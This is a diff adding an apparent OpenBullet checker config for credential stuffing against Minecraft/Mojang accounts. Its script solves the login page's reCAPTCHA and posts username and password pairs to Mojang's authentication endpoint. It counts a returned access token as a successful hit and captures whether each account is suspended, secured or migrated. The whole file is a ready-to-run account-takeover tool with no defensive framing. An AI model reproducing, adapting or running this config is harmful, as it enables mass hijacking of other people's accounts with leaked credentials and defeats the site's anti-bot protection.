@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Minecraft",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-12T18:14:11.4191783-07:00",
+  "AdditionalInfo": "",
+  "Author": "PureWasHere",
+  "Version": "1.3.6 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+RECAPTCHA "https://my.minecraft.net/en-us/login/?return_url=https%3A//my.minecraft.net/en-us/profile/" "6LfbsiMUAAAAAOu1nGK8InBaFrIk17dcbI0sqvzj" -> VAR "CAPTCHA" 
+
+REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"captcha\":\"<CAPTCHA>\",\"captchaSupported\":\"InvisibleReCAPTCHA\",\"password\":\"<PASS>\",\"requestUser\":true,\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Referer: https://my.minecraft.net/en-us/login/?return_url=https%3A//my.minecraft.net/en-us/profile/" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+
+PARSE "<SOURCE>" LR "suspended\":" "," -> CAP "suspended: " 
+
+PARSE "<SOURCE>" LR "secured\":" "," -> CAP "Secured: " 
+
+PARSE "<SOURCE>" LR "fromMigratedUser\":" "}" -> CAP "Migrated Acc: " 
+
